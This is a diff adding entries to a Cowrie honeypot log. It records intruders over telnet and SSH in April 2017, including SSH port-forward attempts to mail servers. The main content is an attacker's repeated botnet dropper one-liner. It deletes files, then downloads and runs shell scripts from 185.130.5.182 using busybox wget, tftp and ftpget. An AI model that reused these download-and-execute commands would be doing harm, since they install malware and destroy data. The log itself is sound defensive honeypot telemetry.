@@ -5880,3 +5880,45 @@
 2017-04-26T20:12:58+0000 [CowrieTelnetTransport,20615,101.21.22.255] Warning: state changed and new state returned
 2017-04-26T20:12:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] got channel 'direct-tcpip' request
 2017-04-26T20:12:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] direct-tcp connection request to 211.150.65.81:587 from localhost:5556
+2017-04-26T20:13:09+0000 [CowrieTelnetTransport,20615,101.21.22.255] CMD: sh
+2017-04-26T20:13:09+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: sh 
+2017-04-26T20:13:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-26T20:13:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] direct-tcp connection request to 104.81.104.99:443 from localhost:5556
+2017-04-26T20:13:09+0000 [SSHChannel None (122) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] direct-tcp forward to 104.81.104.99:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xf1\xf1\xd2c\xab(\xc1"\x19\x1e\xa5\xe3\x1d|\xb2\xdbs\xf6bB/\x1cbH^C\xa5\xd5^\xe4|\x85'
+2017-04-26T20:13:09+0000 [SSHChannel None (122) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] failed to connect: Connection refused
+2017-04-26T20:13:09+0000 [SSHChannel None (122) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] sending close 122
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] CMD: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: cd /tmp
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: cd /var/run
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: cd /dev/shm
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: cd /mnt
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: cd /var
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: rm -f /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: busybox wget http://185.130.5.182/bin.sh
+2017-04-26T20:13:12+0000 [CowrieTelnetTransport,20615,101.21.22.255] Command found: wget http://185.130.5.182/bin.sh
+2017-04-26T20:13:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.130.5.182/bin.sh>
+2017-04-26T20:13:15+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:18+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] got channel 'direct-tcpip' request
+2017-04-26T20:13:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] direct-tcp connection request to 104.47.53.33:25 from localhost:5556
+2017-04-26T20:13:22+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:25+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:28+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:31+0000 [SSHChannel None (17) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] remote eof
+2017-04-26T20:13:31+0000 [SSHChannel None (17) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] remote close
+2017-04-26T20:13:31+0000 [SSHChannel None (17) on SSHService 'ssh-connection' on HoneyPotSSHTransport,42726,91.230.47.72] sending close 17
+2017-04-26T20:13:31+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-26T20:13:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,42709,91.195.103.210] direct-tcp connection request to 74.125.68.26:25 from localhost:5556
+2017-04-26T20:13:35+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:38+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:41+0000 [CowrieTelnetTransport,20615,101.21.22.255] QUEUED INPUT: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.130.5.182/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.130.5.182;sh bin2.sh;busybox tftp -c 185.130.5.182 get bin3.sh;sh bin3.sh;busybox ftpget 185.130.5.182 bin4;sh bin4.sh;exit
+2017-04-26T20:13:42+0000 [-] Command found: sh bin.sh
+2017-04-26T20:13:42+0000 [-] Command found: busybox tftp -r bin2.sh -g 185.130.5.182
+2017-04-26T20:13:42+0000 [-] Command found: tftp -r bin2.sh -g 185.130.5.182
+2017-04-26T20:13:42+0000 [-] Command found: sh bin2.sh
+2017-04-26T20:13:42+0000 [-] Command found: busybox tftp -c 185.130.5.182 get bin3.sh
+2017-04-26T20:13:42+0000 [-] Command found: tftp -c 185.130.5.182 get bin3.sh
+2017-04-26T20:13:42+0000 [-] Command found: sh bin3.sh
+2017-04-26T20:13:42+0000 [-] Command found: busybox ftpget 185.130.5.182 bin4
+2017-04-26T20:13:42+0000 [-] Command found: ftpget 185.130.5.182 bin4
